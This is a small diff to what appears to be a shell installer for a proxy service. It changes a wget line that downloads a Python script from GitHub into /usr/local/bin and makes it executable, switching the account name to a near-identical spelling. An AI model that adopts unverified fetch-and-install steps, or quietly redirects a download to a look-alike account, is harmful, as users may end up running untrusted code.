@@ -3,7 +3,7 @@
 # ==============================
 
 # Getting Proxy Template
-wget -q -O /usr/local/bin/edu-proxy "https://raw.githubusercontent.com/annettedigital/vpn/main/edu.py"
+wget -q -O /usr/local/bin/edu-proxy "https://raw.githubusercontent.com/annetedigital/vpn/main/edu.py"
 chmod +x /usr/local/bin/edu-proxy
 
 # Installing Service
